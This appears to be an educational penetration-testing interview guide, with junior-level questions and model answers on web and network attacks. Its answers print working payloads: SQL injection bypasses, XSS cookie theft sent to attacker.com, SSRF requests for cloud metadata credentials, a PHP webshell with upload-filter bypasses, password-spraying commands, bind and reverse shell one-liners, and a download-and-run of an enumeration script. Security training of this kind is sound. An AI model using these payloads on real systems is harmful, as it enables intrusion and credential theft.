# Interview Q&A — Junior Level

!!! tip "What Changes at This Level"
    Junior-level interviews move from pure concepts to demonstrated knowledge of tools and techniques. "I know what SQLi is" → "I can find it, exploit it, and report it." You're expected to walk through an engagement end-to-end and discuss specific findings you've worked with.

---

### Q1. Walk me through how you'd approach an external black-box web application pentest from the very beginning.

??? note "Concept Answer"
    Structured methodology: pre-engagement (scope, ROE, authorization) → passive recon (WHOIS, DNS, Google dorks, Shodan, certificate transparency) → active recon (port scanning, technology fingerprinting) → vulnerability identification → exploitation → post-exploitation → reporting.

??? warning "What the Interviewer Is Testing"
    They want to see structured thinking, not tool names. Do you have a methodology or do you just run Nmap and Burp? Can you prioritize? Do you mention authorization before doing anything technical? The "what do you do first" question reveals discipline.

??? success "Model Answer to Give"
    "Before touching the target, I confirm written authorization is in place — the signed SOW and ROE. Without that, nothing else happens.

    Phase 1 — Passive reconnaissance: I start with zero active interaction. WHOIS for registrant, IP range, and nameserver info. DNS enumeration — dig for all record types, zone transfer attempt against all nameservers. Certificate transparency logs via crt.sh to discover subdomains. Google dorks for exposed files, login panels, error messages, and indexed sensitive content. Shodan for what's exposed on the IP range — software versions, unusual ports. GitHub recon for hardcoded secrets.

    Phase 2 — Active recon: Nmap against discovered IPs and ports — `nmap -sV -sC -p- --min-rate 5000` for a full sweep, then targeted service scans. Technology fingerprinting with whatweb and manual header inspection. Crawl the web application structure — Burp Suite spider or gobuster for endpoint discovery.

    Phase 3 — Vulnerability identification: Burp Suite as intercepting proxy for manual testing. For each endpoint: authentication bypass attempts, injection points (SQLi, XSS, SSTI, command injection), access control checks (IDOR, privilege escalation), business logic testing, file upload if present. Supplement with nuclei for known CVEs and misconfigurations.

    Phase 4 — Exploitation: Confirm findings with minimal PoC — enough to demonstrate impact without causing harm. Chain findings when possible — a CSRF plus stored XSS to demonstrate admin account takeover, for example.

    Phase 5 — Reporting: Document every step, every payload, every response. Structure the report with executive summary for business stakeholders and detailed technical findings with reproduction steps for developers.

    Throughout, I stay strictly within scope, document everything in real time, and flag any findings that suggest the system is already compromised."

---

### Q2. Explain SQL injection and write a payload that would bypass a login form.

??? note "Concept Answer"
    SQLi occurs when user input is incorporated into SQL queries without parameterization. A login form with `WHERE username='$input' AND password='$pass'` can be bypassed by injecting SQL syntax that makes the condition always true or comments out the password check.

??? warning "What the Interviewer Is Testing"
    They want both the concept and the practical payload. Many candidates explain SQLi but can't write a payload on the spot. They may follow up: "How would you enumerate the database schema?" or "How would you get the server to execute OS commands?"

??? success "Model Answer to Give"
    "SQL injection happens when user input is embedded in a SQL query without parameterization. The input breaks out of the data context into the query command context.

    Classic login form backend:
    ```sql
    SELECT * FROM users WHERE username='$user' AND password='$pass'
    ```

    Injection: username = `admin'--`
    ```sql
    SELECT * FROM users WHERE username='admin'--' AND password='anything'
    ```
    The `--` is a SQL comment — everything after is ignored. The password check is completely removed. We authenticate as admin with no password.

    Alternative payloads:
    ```sql
    ' OR 1=1--          # Always-true condition, returns first user
    ' OR '1'='1'--      # Quote-balanced version
    admin'/*            # Block comment variation
    ' OR 1=1#           # MySQL hash comment
    ```

    To go beyond authentication bypass to data extraction, I'd enumerate columns with ORDER BY, then use UNION SELECT to pull data from other tables:
    ```sql
    ' UNION SELECT username,password,3 FROM users--
    ```

    If I need OS command execution on MSSQL with DBA privileges:
    ```sql
    '; EXEC xp_cmdshell 'whoami'--
    ```

    Prevention: parameterized queries — the only reliable fix:
    ```python
    cursor.execute('SELECT * FROM users WHERE username=%s AND password=%s', (username, password))
    ```"

---

### Q3. What is Cross-Site Scripting (XSS)? What's the difference between reflected, stored, and DOM-based?

??? note "Concept Answer"
    XSS injects malicious scripts into web pages viewed by other users. Reflected: script in request, reflected in response (requires victim to click crafted link). Stored: script persisted in database, executes for all viewers. DOM-based: vulnerability in client-side JavaScript, no server-side reflection.

??? warning "What the Interviewer Is Testing"
    Whether you can distinguish the three types *mechanically*, not just by definition. The follow-up is almost always: "What can an attacker do with XSS?" They want: steal cookies, hijack session, keylogging, CSRF bypass, redirect, cryptomining, phishing in context.

??? success "Model Answer to Give"
    "XSS allows injecting JavaScript that executes in another user's browser — within the context of the vulnerable site, so it has access to cookies, localStorage, and the DOM.

    **Reflected XSS:** The payload travels in the HTTP request (URL parameter, POST field) and appears in the response without being stored. The victim must click a specially crafted URL.
    ```
    http://target.com/search?q=<script>alert(document.cookie)</script>
    ```
    Impact: if the victim clicks this, their cookies are exposed. Lower persistence than stored — only affects users who click the crafted link.

    **Stored XSS:** The payload is saved to the database (comment, profile field, username). Every user who views that content executes the script. No crafted link needed — much more dangerous.
    ```javascript
    // In a comment field:
    <script>fetch('https://attacker.com/?c='+document.cookie)</script>
    // Executes for every visitor who reads that comment
    ```

    **DOM-based XSS:** The sink is client-side JavaScript — `innerHTML`, `document.write`, `eval`. The payload never reaches the server, so server-side output encoding doesn't help. 
    ```javascript
    // Vulnerable JS: document.getElementById('msg').innerHTML = location.hash.slice(1);
    // Attack URL: http://target.com/page#<img src=x onerror=alert(1)>
    ```

    What attackers do with XSS beyond `alert(1)`:
    - Steal session cookies: `new Image().src='https://attacker.com/?c='+document.cookie`
    - Bypass CSRF tokens: JavaScript can read CSRF tokens from the DOM and submit forms
    - Keylog: capture all keystrokes via event listeners
    - Defacement
    - Redirect to phishing pages
    - Drive-by malware delivery (redirect to exploit kit)
    - Session hijacking via account takeover

    Prevention: output encoding appropriate to context (HTML entities for HTML context, JS escaping for JS context), Content Security Policy (CSP) to restrict script sources, HttpOnly cookie flag to prevent JavaScript access to session cookies."

---

### Q4. What is IDOR and how do you find it?

??? note "Concept Answer"
    Insecure Direct Object Reference — the application uses a user-controlled value (ID, filename) to access an object without verifying the requester is authorized. Test by changing the object reference to another user's.

??? warning "What the Interviewer Is Testing"
    IDOR is the most commonly missed finding by automated scanners and one of the most commonly found by manual testers. They want to see your manual testing methodology, not just the definition. What do you look for? What do you change? How do you confirm impact?

??? success "Model Answer to Give"
    "IDOR is when the application uses a user-supplied reference — an ID, a filename, an order number — to directly access an object, without checking whether the current user is authorized for that object.

    How I find it systematically:

    1. Map all endpoints that reference user-specific objects: `/api/invoice/1042`, `/download?file=report_1042.pdf`, `/profile?user_id=1042`

    2. For each, I create two test accounts (User A and User B). Authenticate as User A, capture the request, then change the object reference to User B's. If User A can access User B's data — IDOR confirmed.

    3. For numeric IDs: increment, decrement, try 0, -1, large numbers.

    4. For UUIDs or hashes: these are harder to guess, but IDOR can still exist if the application leaks another user's UUID elsewhere — in a different API endpoint, in a shared URL, in a notification email.

    5. For filenames: try path traversal as well — `../../etc/passwd`.

    6. Check HTTP methods: sometimes DELETE or PUT are protected but GET isn't. Or the object reference is in a header instead of a URL.

    Real-world example: I tested an HR portal where the API endpoint was `/api/payslips/{payslip_id}`. The authenticated user could only see their own payslips in the UI, but the API had no authorization check — changing the payslip_id parameter returned any employee's salary information. IDOR with Confidentiality: High impact on an HR system is a Critical finding regardless of CVSS base score because of the sensitivity of the data."

---

### Q5. Explain SSRF. What's the impact in a cloud environment?

??? note "Concept Answer"
    SSRF causes the server to make requests to attacker-specified destinations. The server's network position allows accessing internal services. In cloud, the instance metadata service (169.254.169.254) returns temporary cloud credentials.

??? warning "What the Interviewer Is Testing"
    SSRF understanding is now expected even at junior level because of how critical it's been in real-world cloud breaches. They want to see you go beyond "server makes a request" to the cloud credential theft impact — that's what makes SSRF a Critical in AWS environments.

??? success "Model Answer to Give"
    "SSRF tricks a server into making HTTP requests to locations specified by the attacker. The key insight is that these requests originate from the server's network position and trust context — not from the attacker's external IP.

    Finding SSRF: any parameter that accepts a URL, webhook endpoint, remote resource path, or XML with external entities is a candidate.
    ```
    ?url=https://attacker.com/      # Confirm with Burp Collaborator
    ?url=http://localhost/admin     # Access admin panel only accessible locally
    ?url=http://10.0.0.1:8080/     # Internal network services
    ```

    In cloud environments, the critical target is the instance metadata service:
    ```
    # AWS
    ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
    
    # Returns:
    {
      "AccessKeyId": "ASIAXXX",
      "SecretAccessKey": "...",
      "Token": "...",
      "Expiration": "2024-03-15T12:00:00Z"
    }
    ```

    These are valid temporary AWS credentials. With them, I can authenticate to the AWS API and do anything the EC2 instance's IAM role permits — list S3 buckets, describe EC2 instances, access Secrets Manager, assume roles. In the Capital One breach (2019), SSRF against a misconfigured WAF led to metadata credential theft and exfiltration of 100+ million customer records.

    AWS has introduced IMDSv2 to mitigate this — it requires a session token obtained via a PUT request before IMDS responds. Simple SSRF via GET can't get IMDSv2 metadata. But SSRF that can make PUT requests (or that works through a redirect) can still be exploited.

    Azure metadata: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (requires `Metadata: true` header).
    GCP: `http://metadata.google.internal/computeMetadata/v1/` (requires `Metadata-Flavor: Google` header)."

---

### Q6. How does Nmap's SYN scan differ from a connect scan? When would you use each?

??? note "Concept Answer"
    SYN scan sends SYN, receives SYN-ACK/RST, then immediately sends RST — never completes the handshake. Connect scan completes the full handshake. SYN is stealthier (no application log), requires root. Connect doesn't require root, but is logged.

??? warning "What the Interviewer Is Testing"
    Deep Nmap knowledge, not surface. The "when would you use connect scan" follow-up reveals whether you've actually thought about real operational constraints.

??? success "Model Answer to Give"
    "The difference is whether the TCP three-way handshake completes.

    SYN scan (`-sS`): sends SYN → receives SYN-ACK from open ports → immediately sends RST. The handshake never completes, so the application layer never records a connection. Only kernel-level logs see it. Requires raw socket privileges (root/Administrator).

    TCP Connect scan (`-sT`): uses the OS networking stack to complete the full three-way handshake — SYN, SYN-ACK, ACK. The OS then tears it down with FIN. The application layer logs a completed connection. Doesn't require root because it's using standard socket calls, not raw sockets.

    When I'd use connect over SYN:
    1. I'm on a scanning box where I can't get root — rare but happens during internal assessments on a provided workstation.
    2. Scanning through a proxy or SOCKS tunnel via proxychains — raw socket operations don't work through proxychains, so `-sT` is the only option when pivoting.
    3. Scanning some load balancers or cloud environments that reset half-open connections — a full connect confirms the port is actually serving something, not just TCP reachable.

    In practice, `-sS` is my default for direct scans with root access. It's faster, produces less noise in application logs, and works for 99% of scenarios."

---

### Q7. What is the difference between encoding, encryption, and hashing? Why can't you use MD5 for passwords?

??? note "Concept Answer"
    Encoding: reversible representation change (Base64), no key, no security. Encryption: reversible with key. Hashing: one-way, fixed output. MD5 is too fast (billions per second on GPU), unsalted (rainbow tables), and has known collision vulnerabilities.

??? warning "What the Interviewer Is Testing"
    This is asked in both junior and senior interviews. At junior level they want the basic distinctions and one practical implication. A strong answer includes "MD5 for passwords is fast by design — we need slow algorithms like bcrypt."

??? success "Model Answer to Give"
    "Three completely different things:

    **Encoding** — reversible representation change, no key needed, zero security. Base64 of 'password' is 'cGFzc3dvcmQ=' — trivially reversed by anyone. Used for data format compatibility (binary over text channels), not security.

    **Encryption** — reversible *with the correct key*. AES-256 encrypts data so it's unreadable without the key. Two-way operation. Used for data confidentiality in transit and at rest.

    **Hashing** — one-way. Input → fixed-length output, can't reverse. SHA-256('password') = '5e884898...'. Same input always produces same output, but you cannot recover input from output.

    **Why MD5 fails for passwords:**
    1. **Speed:** MD5 was designed to be fast — a modern GPU can compute 50+ billion MD5 hashes per second. If an attacker gets your MD5 hash database, they can try every word in rockyou.txt (14 million passwords) in milliseconds.
    2. **No salt:** Without a random per-user salt, the same password produces the same hash across all users. This enables rainbow table attacks — precomputed hash-to-password lookup tables. Find the hash, look up the password instantly.
    3. **Broken for integrity:** MD5 has known collision vulnerabilities — two different inputs producing the same hash. This breaks certificate signing and code integrity verification, though it's less relevant specifically for password storage.

    Password hashing needs a *deliberately slow* algorithm: bcrypt, scrypt, or Argon2. bcrypt takes ~100ms per hash — trivial for a single login check, but makes 50 billion attempts per second computationally infeasible. Combined with a unique per-user salt, the entire hash database must be cracked individually. This is what 'properly hashed passwords' means."

---

### Q8. You find a file upload feature. What's your testing methodology?

??? note "Concept Answer"
    Test for unrestricted file upload allowing server-side code execution (PHP webshell, ASPX shell, JSP shell), path traversal in filename, file type bypass techniques (double extension, null byte, MIME type manipulation), and storage location (is uploaded content served from a web-accessible directory?).

??? warning "What the Interviewer Is Testing"
    Systematic testing methodology, not just "I upload a PHP shell." They want to see your bypass techniques when initial attempts are blocked, and your understanding of what makes a file upload dangerous (execution context vs just storage).

??? success "Model Answer to Give"
    "File upload is one of the highest-impact vulnerabilities when exploitable, because the end goal is remote code execution via a webshell.

    My methodology:

    **Step 1: Understand the context.** What types of files are expected? Where are uploaded files stored? Are they served from the same web server or a separate static file server (S3, CDN)? If files are served from an isolated static server, even unrestricted upload is low-risk because the server won't execute code.

    **Step 2: Test what's blocked.** Try a simple PHP webshell first:
    ```php
    <?php system($_GET['cmd']); ?>
    ```
    Upload as `shell.php`. If blocked, understand *how* it's blocked — server-side MIME check? Extension blacklist? Content inspection?

    **Step 3: Bypass content-type validation.** Many implementations check only the `Content-Type` header — attacker-controlled. Change `Content-Type: application/php` to `Content-Type: image/jpeg` while keeping the PHP payload in the body.

    **Step 4: Bypass extension blacklists.**
    ```
    shell.php3, shell.php4, shell.php5, shell.phtml, shell.phar
    shell.PHP  (case variation — case-insensitive OS)
    shell.php.jpg  (double extension — server may execute based on first extension)
    shell.php%00.jpg  (null byte — truncates at %00 in C-based parsers)
    shell.php;.jpg  (semicolon bypass)
    .htaccess upload to enable PHP execution on .jpg files
    ```

    **Step 5: Bypass content inspection.** Add a valid JPEG magic bytes at the start:
    ```
    ÿØÿ <?php system($_GET['cmd']); ?>
    # JPEG magic bytes + PHP payload
    # Pass image header check but still execute PHP
    ```
    Exiftool to embed PHP in EXIF data: `exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg`

    **Step 6: Find the upload path.** The file uploaded successfully — now where? Check the response for the URL, check common paths (`/uploads/`, `/files/`, `/media/`), use gobuster.

    **Step 7: Execute.** Navigate to the webshell URL and test execution: `?cmd=id`.

    **Step 8: Escalate.** From webshell to reverse shell for better interactivity, then post-exploitation.

    Non-execution risks: even if execution isn't possible, check for path traversal in filenames: `../../../etc/crontab` — overwriting system files."

---

### Q9. What is a CSRF attack and how is it prevented?

??? note "Concept Answer"
    CSRF (Cross-Site Request Forgery) tricks a victim's browser into making an authenticated request to a site the victim is logged into. The victim's browser automatically includes cookies. Prevention: CSRF tokens, SameSite cookie attribute, custom headers, double-submit cookie.

??? warning "What the Interviewer Is Testing"
    Understanding of browser security model and same-origin policy. They want you to explain *why* CSRF works — browser automatic cookie inclusion. Common follow-up: "Why doesn't XSS bypass a CSRF token?"

??? success "Model Answer to Give"
    "CSRF exploits the browser's automatic behavior of including cookies with every request to a domain, regardless of which site initiates the request.

    Scenario: Alice is logged into bank.com (has a session cookie). Alice visits evil.com. evil.com contains:
    ```html
    <img src='https://bank.com/transfer?to=attacker&amount=5000'>
    ```
    When Alice's browser loads evil.com, it fetches this 'image' URL — sending Alice's bank.com session cookie with the request. The bank processes a legitimate-looking transfer request from Alice's authenticated session.

    The bank can't distinguish: did Alice initiate this, or did a malicious site initiate it in Alice's browser?

    **Prevention:**

    **CSRF token:** A random, unpredictable, per-session or per-request token included in forms and validated server-side:
    ```html
    <input type='hidden' name='csrf_token' value='a8f3b2c...'>
    ```
    evil.com cannot read bank.com's CSRF token (cross-origin reads are blocked by Same-Origin Policy), so it can't forge a valid request.

    **SameSite cookie attribute:** `SameSite=Strict` — cookies are not sent with cross-site requests at all. `SameSite=Lax` — cookies sent only with top-level GET navigation, not with embedded requests. This is now the most effective browser-level defense and is the default in modern browsers for new cookies.

    **Custom request header:** Add a custom header like `X-Requested-With: XMLHttpRequest`. Cross-origin JavaScript requests can't add custom headers without CORS preflight, which the bank wouldn't permit from evil.com.

    **Referer/Origin validation:** Check that the request came from the expected origin. Imperfect — Referer can be suppressed.

    The XSS bypass: if bank.com is XSS-vulnerable, JavaScript running *on bank.com* can read the CSRF token from the DOM and submit a forged request with a valid token. This is why XSS is so impactful — it bypasses token-based CSRF protection. SameSite cookies are the only defense that XSS cannot bypass, because the cookie behavior is enforced by the browser regardless of what JavaScript runs."

---

### Q10. How do you perform password spraying and why is it different from brute force?

??? note "Concept Answer"
    Password spraying: one or few passwords tried against many users. Brute force: many passwords tried against one user. Spraying avoids account lockout by staying under the threshold per account. Used to find accounts using common passwords without triggering lockout.

??? warning "What the Interviewer Is Testing"
    Operational security awareness — understanding *why* you'd use one over the other, and knowledge of lockout thresholds. They want to see you understand that blind brute force is noisy and counterproductive in real engagements.

??? success "Model Answer to Give"
    "Brute force tries many passwords against one account — 'admin: password1, admin: password2, admin: password3...'. This quickly hits account lockout thresholds (typically 5-10 failed attempts), locks the account, and generates obvious alerts. In a real engagement, locking out accounts disrupts the client's business and is a scope violation.

    Password spraying flips the approach: one password against many accounts simultaneously — 'admin: Summer2024!, user1: Summer2024!, user2: Summer2024!...'. Each account sees only one failed attempt — well under lockout threshold. Meanwhile, you're testing hundreds of accounts with the same password.

    Why this works: a meaningful percentage of users in any organization use predictable passwords that follow the same pattern — `Company2024!`, `Season+Year+Symbol`, the company name with common mutations. Spraying finds these without locking any account.

    Operational considerations:
    - First, determine the lockout threshold. If I don't know it, I stay conservative — maximum 1 attempt per account per 30 minutes.
    - Spread attempts over time — don't spray 500 accounts in 10 seconds.
    - Good target password candidates: `Company2024!`, `Welcome1`, `Summer2024`, `Password123`, `P@ssw0rd`, month+year combos.
    - After finding a valid credential, stop spraying that account.

    Tools:
    ```bash
    # CrackMapExec — SMB spray
    cme smb dc.corp.local -u users.txt -p 'Summer2024!' --continue-on-success

    # Kerbrute — Kerberos pre-auth spray (stealthier than LDAP spray)
    kerbrute passwordspray -d corp.local users.txt 'Summer2024!'
    ```

    Kerbrute is preferred because Kerberos pre-auth failures often generate less visible Windows event IDs than LDAP/SMB failures, though modern EDR detects both."

---

### Q11. What is the difference between a bind shell and a reverse shell? When would you use each?

??? note "Concept Answer"
    Bind shell: malicious process opens a listening port on the victim. Attacker connects to it. Reverse shell: victim connects back to attacker. Reverse shells bypass most inbound firewall rules because they use an outbound connection.

??? warning "What the Interviewer Is Testing"
    Understanding of firewall traversal and why reverse shells are the default. They may ask about encrypted reverse shells or HTTPS-tunneled shells.

??? success "Model Answer to Give"
    "Bind shell: exploited process opens a listening port on the victim machine. Attacker connects to that port to get a shell. Simple, but fails if the victim is behind a firewall that blocks inbound connections — which is almost always the case.

    Reverse shell: exploited process initiates an outbound connection from the victim to the attacker. The attacker runs a listener (nc -lvnp 4444) and the victim calls back. Outbound connections are almost never blocked, so reverse shells work through most firewalls.

    ```bash
    # Bind shell (victim listens):
    victim$ nc -lvnp 4444 -e /bin/bash
    attacker$ nc victim_ip 4444

    # Reverse shell (victim calls out):
    attacker$ nc -lvnp 4444
    victim$ bash -i >& /dev/tcp/attacker_ip/4444 0>&1
    ```

    Operational considerations:
    - Port selection matters for reverse shells — egress filtering may block unusual ports. Port 443 or 80 blend with normal web traffic and are almost never filtered outbound.
    - For evasion: `reverse_https` payload in Metasploit tunnels the shell in HTTPS traffic — even SSL inspection can't distinguish it from legitimate HTTPS without certificate pinning.
    - For internal pivoting (already inside the network targeting an isolated segment): bind shells may be more appropriate if you can't establish outbound connectivity from the isolated segment to your attacker machine.
    - If the target has a strict egress proxy that terminates connections: DNS-based C2 (traffic tunneled in DNS queries) bypasses HTTP/S filtering."

---

### Q12. You've exploited a vulnerability and have a low-privilege shell on a Linux machine. What's your first set of actions?

??? note "Concept Answer"
    Stabilize the shell → understand context (who am I, what OS, what's running, what's the network) → look for privilege escalation paths → maintain access → stay within scope.

??? warning "What the Interviewer Is Testing"
    Post-exploitation methodology. They want to see systematic enumeration before jumping to privesc, and evidence that you think about scope and impact while operating. Many candidates jump straight to "run linPEAS" — a good answer shows thought before tools.

??? success "Model Answer to Give"
    "First, stabilize the shell — a raw nc shell dies if I Ctrl+C:
    ```bash
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    # Ctrl+Z, then: stty raw -echo; fg; Enter Enter
    ```

    Then: situational awareness before anything else.
    ```bash
    whoami && id          # Who am I? UID, GID, groups
    hostname              # Machine name
    uname -a              # OS version, kernel
    cat /etc/os-release   # Distribution
    ip a / ifconfig       # Network interfaces — am I on multiple subnets?
    ss -tulpn             # Listening services — what else is running locally?
    ps aux                # Running processes
    cat /etc/passwd       # User list
    ```

    This 60-second situational awareness tells me: Am I already root (rare but happens)? What OS and kernel (for kernel exploit candidates)? Am I on a machine with multiple interfaces — is this a pivot point into another network segment? Are there services listening only on localhost that I couldn't see from outside?

    Then privilege escalation enumeration. I run linPEAS for comprehensive output:
    ```bash
    curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash
    # Or transfer and run:
    wget http://attacker_ip/linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh
    ```

    While linPEAS runs, manual quick checks:
    ```bash
    sudo -l                          # What can I sudo?
    find / -perm -4000 2>/dev/null   # SUID files
    crontab -l && cat /etc/crontab  # Cron jobs
    find / -writable -type f 2>/dev/null  # World-writable files
    cat ~/.bash_history              # Command history
    find / -name '*.conf' 2>/dev/null | xargs grep -l password  # Config files with creds
    ```

    Throughout this, I stay within scope. If I discover this machine has a network interface to an out-of-scope subnet, I don't probe it — I document it and flag it in my report as a potential pivot point. If I find credentials that might work on out-of-scope systems, I don't test them — I report the credential exposure finding."

---

### Q13. What's the difference between symmetric and asymmetric encryption, and how does TLS use both?

??? warning "What the Interviewer Is Testing"
    This is Level 0 content asked at Level 1 to confirm it's truly internalized. The TLS combination question is the depth check. Refer to Level 0 Q14 for the model answer — at Level 1, you should be able to answer this in under 90 seconds without hesitation.

??? success "Model Answer to Give"
    "Symmetric: one key for encrypt and decrypt. Fast. Key distribution problem — how do two parties share a key securely over an untrusted channel?

    Asymmetric: public/private key pair. What one encrypts, only the other decrypts. Solves key distribution — publish your public key freely. But computationally expensive — orders of magnitude slower than symmetric.

    TLS uses both: asymmetric for the handshake (Diffie-Hellman key exchange) to securely establish a shared secret without transmitting it, then symmetric (AES-256-GCM) for all actual data transfer using that shared secret as the key. Best of both: no pre-shared secret needed, fast bulk encryption.

    TLS 1.3 enforces ephemeral DH (ECDHE) for every session — Perfect Forward Secrecy. Even if the server's private key is later compromised, past sessions can't be decrypted because each session's key was derived from ephemeral parameters that were discarded."

---

!!! tip "Interview Practice"
    At this level, you should be comfortable drawing out SQL injection or XSS on a whiteboard, writing a basic payload from memory, and walking through a finding you've actually documented. Practice out loud — answers that read well often sound stilted when spoken without practice.
